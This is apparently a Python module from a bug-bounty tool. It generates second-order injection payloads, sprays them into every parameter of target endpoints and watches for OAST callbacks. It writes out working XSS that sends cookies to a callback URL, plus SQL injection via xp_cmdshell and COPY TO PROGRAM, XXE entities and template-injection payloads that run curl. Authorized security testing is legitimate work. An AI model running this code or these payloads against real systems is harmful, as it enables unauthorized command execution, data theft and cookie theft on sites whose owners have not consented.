"""
Stored Payload Tracker -- second-order vulnerability detection.

Tracks injected payloads across requests and verifies delayed triggers via
OAST callbacks. Payloads persist to disk so they survive across hunt phases
(inject in Phase 2, trigger in Phase 5).
"""

import json
import os
import time
import uuid
from dataclasses import dataclass, asdict
from typing import Any, Dict, List

FINDINGS_ROOT = 'C:/Users/vaugh/BountyHound/findings'


@dataclass
class InjectedPayload:
    """Record of a payload injected into a target."""
    id: str
    payload: str
    payload_type: str          # xss, sqli, ssrf, xxe, ssti
    injection_point: str       # URL + param where injected
    injection_method: str      # POST body, query param, header, cookie
    callback_id: str           # OAST callback identifier
    injected_at: str           # ISO timestamp
    target: str
    triggered: bool = False
    triggered_at: str = ''
    trigger_source: str = ''


@dataclass
class SecondOrderFinding:
    """A confirmed second-order vulnerability."""
    payload: InjectedPayload
    trigger_details: Dict[str, Any]
    severity: str              # HIGH or CRITICAL
    description: str
    evidence: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            'payload': asdict(self.payload),
            'trigger_details': self.trigger_details,
            'severity': self.severity,
            'description': self.description,
            'evidence': self.evidence,
        }


_SEVERITY_MAP = {
    'xss': 'HIGH', 'sqli': 'CRITICAL', 'ssrf': 'HIGH',
    'xxe': 'CRITICAL', 'ssti': 'CRITICAL',
}


class StoredPayloadTracker:
    """Tracks stored/injected payloads and detects second-order triggers."""

    def __init__(self, target: str, oast_client=None):
        self.target = target
        self._payloads: List[InjectedPayload] = []
        self._findings: List[SecondOrderFinding] = []
        if oast_client is not None:
            self._oast = oast_client
        else:
            from engine.core.oast_client import OASTClient
            self._oast = OASTClient()
        if not self._oast.listener_active:
            try:
                self._oast.start_listener()
            except RuntimeError:
                pass
        self._load_persisted()

    # -- Payload generation ------------------------------------------------

    def generate_stored_payloads(self, vuln_type: str,
                                  injection_point: str) -> List[Dict[str, str]]:
        """Generate payloads with OAST callbacks. Returns [{payload, callback_id, payload_type}]."""
        generators = {
            'xss': self._gen_xss, 'sqli': self._gen_sqli,
            'ssrf': self._gen_ssrf, 'xxe': self._gen_xxe, 'ssti': self._gen_ssti,
        }
        gen_fn = generators.get(vuln_type)
        if gen_fn is None:
            return []
        return [
            {'payload': p, 'callback_id': cid, 'payload_type': vuln_type}
            for p, cid in gen_fn(injection_point)
        ]

    def _cb(self, prefix: str) -> tuple:
        uid = f"{prefix}-{uuid.uuid4().hex[:8]}"
        return self._oast.generate_callback(uid), uid

    def _gen_xss(self, pt: str) -> List[tuple]:
        r = []
        u, i = self._cb('xss'); r.append((f"<img src=x onerror=fetch('{u}')>", i))
        u, i = self._cb('xss'); r.append((f"<script>new Image().src='{u}?c='+document.cookie</script>", i))
        u, i = self._cb('xss'); r.append((f'<svg onload="fetch(\'{u}\')">', i))
        return r

    def _gen_sqli(self, pt: str) -> List[tuple]:
        r = []
        u, i = self._cb('sqli'); r.append((f"'; COPY (SELECT '') TO PROGRAM 'curl {u}'--", i))
        u, i = self._cb('sqli'); r.append((f"'; SELECT LOAD_FILE('{u}')--", i))
        u, i = self._cb('sqli'); r.append((f"1; EXEC xp_cmdshell('curl {u}')--", i))
        return r

    def _gen_ssrf(self, pt: str) -> List[tuple]:
        return [self._cb('ssrf') for _ in range(3)]

    def _gen_xxe(self, pt: str) -> List[tuple]:
        r = []
        u, i = self._cb('xxe')
        r.append((f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{u}">]><root>&xxe;</root>', i))
        u, i = self._cb('xxe')
        r.append((f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{u}"> %xxe;]><root>t</root>', i))
        return r

    def _gen_ssti(self, pt: str) -> List[tuple]:
        r = []
        u, i = self._cb('ssti')
        r.append(("{{request.application.__globals__.__builtins__.__import__('os')"
                   f".popen('curl {u}').read()}}", i))
        u, i = self._cb('ssti')
        r.append((f"${{T(java.lang.Runtime).getRuntime().exec('curl {u}')}}", i))
        return r

    # -- Recording ---------------------------------------------------------

    def record_injection(self, payload: str, payload_type: str,
                         injection_point: str, method: str,
                         callback_id: str) -> None:
        """Record that a payload was successfully injected."""
        self._payloads.append(InjectedPayload(
            id=uuid.uuid4().hex[:12], payload=payload,
            payload_type=payload_type, injection_point=injection_point,
            injection_method=method, callback_id=callback_id,
            injected_at=time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            target=self.target,
        ))
        self.persist()

    # -- Trigger detection -------------------------------------------------

    def check_triggers(self, timeout: int = 60) -> List[SecondOrderFinding]:
        """Poll OAST for callbacks and match to injected payloads."""
        callbacks = self._oast.poll_callbacks(timeout=timeout, interval=3)
        if not callbacks:
            return []
        lookup = {p.callback_id: p for p in self._payloads if not p.triggered}
        new_findings: List[SecondOrderFinding] = []
        for cb in callbacks:
            matched = lookup.get(cb.unique_id)
            if matched is None:
                continue
            matched.triggered = True
            matched.triggered_at = cb.timestamp
            matched.trigger_source = cb.source_ip
            severity = _SEVERITY_MAP.get(matched.payload_type, 'HIGH')
            desc = (f"Second-order {matched.payload_type.upper()} confirmed. "
                    f"Payload injected at {matched.injection_point} via "
                    f"{matched.injection_method} triggered callback from {cb.source_ip}.")
            evidence = (
                f"INJECTION:\n  Point: {matched.injection_point}\n"
                f"  Method: {matched.injection_method}\n"
                f"  Payload: {matched.payload}\n  Time: {matched.injected_at}\n\n"
                f"TRIGGER:\n  Callback ID: {cb.unique_id}\n"
                f"  Source IP: {cb.source_ip}\n  Time: {cb.timestamp}\n"
                f"  Raw: {cb.raw_request[:500]}")
            finding = SecondOrderFinding(
                payload=matched, severity=severity, description=desc,
                evidence=evidence, trigger_details={
                    'callback_id': cb.unique_id, 'source_ip': cb.source_ip,
                    'timestamp': cb.timestamp, 'protocol': cb.protocol,
                    'raw_request': cb.raw_request[:1000], 'metadata': cb.metadata,
                })
            new_findings.append(finding)
            self._findings.append(finding)
        if new_findings:
            self.persist()
        return new_findings

    def run_trigger_scan(self, trigger_urls: List[str],
                         browser=None) -> List[SecondOrderFinding]:
        """Visit URLs where stored payloads might trigger, then check callbacks.

        Args:
            trigger_urls: Pages to visit (admin panels, dashboards, etc.)
            browser: Optional Playwright page object for JS-triggered payloads.
        """
        for url in trigger_urls:
            try:
                if browser is not None:
                    browser.goto(url, timeout=15000)
                    time.sleep(2)
                else:
                    from engine.core.http_client import HttpClient
                    HttpClient(timeout=15, target=self.target).get(url)
            except Exception:
                continue
        return self.check_triggers(timeout=30)

    # -- Bulk injection ----------------------------------------------------

    def inject_everywhere(self, endpoints: List[Dict],
                          max_payloads: int = 3) -> int:
        """Inject stored payloads into every param of every endpoint.

        Each endpoint: {url: str, method: str, params: List[str]}
        Returns count of payloads injected.
        """
        from engine.core.http_client import HttpClient
        client = HttpClient(timeout=15, target=self.target)
        count = 0
        for ep in endpoints:
            url = ep.get('url', '')
            method = ep.get('method', 'GET').upper()
            for param in ep.get('params', []):
                for vtype in ('xss', 'sqli', 'ssti'):
                    for pl in self.generate_stored_payloads(vtype, f"{url}?{param}")[:max_payloads]:
                        try:
                            if method == 'POST':
                                client.post_json(url, {param: pl['payload']})
                            else:
                                sep = '&' if '?' in url else '?'
                                client.get(f"{url}{sep}{param}={pl['payload']}")
                            self.record_injection(
                                pl['payload'], pl['payload_type'],
                                f"{url}?{param}", f"{method} {param}",
                                pl['callback_id'])
                            count += 1
                        except Exception:
                            continue
        return count

    # -- Persistence -------------------------------------------------------

    def _persist_path(self) -> str:
        d = os.path.join(FINDINGS_ROOT, self.target)
        os.makedirs(d, exist_ok=True)
        return os.path.join(d, 'stored_payloads.json')

    def persist(self) -> None:
        """Save injected payloads to disk."""
        with open(self._persist_path(), 'w', encoding='utf-8') as f:
            json.dump([asdict(p) for p in self._payloads], f, indent=2)

    def _load_persisted(self) -> None:
        """Load previously injected payloads from disk."""
        path = self._persist_path()
        if not os.path.exists(path):
            return
        try:
            with open(path, 'r', encoding='utf-8') as f:
                for item in json.load(f):
                    self._payloads.append(InjectedPayload(**item))
        except (json.JSONDecodeError, TypeError, KeyError):
            pass

    # -- Summary -----------------------------------------------------------

    def get_summary(self) -> str:
        """Human-readable summary of tracker state."""
        total = len(self._payloads)
        triggered = sum(1 for p in self._payloads if p.triggered)
        by_type: Dict[str, Dict[str, int]] = {}
        for p in self._payloads:
            e = by_type.setdefault(p.payload_type, {'injected': 0, 'triggered': 0})
            e['injected'] += 1
            if p.triggered:
                e['triggered'] += 1
        lines = [
            f"Stored Payload Tracker: {self.target}",
            f"  Total injected:  {total}",
            f"  Pending:         {total - triggered}",
            f"  Triggered:       {triggered}",
            f"  Findings:        {len(self._findings)}",
        ]
        if by_type:
            lines.append("  By type:")
            for vt, c in sorted(by_type.items()):
                lines.append(f"    {vt.upper():5s}  {c['injected']} injected, {c['triggered']} triggered")
        return '\n'.join(lines)
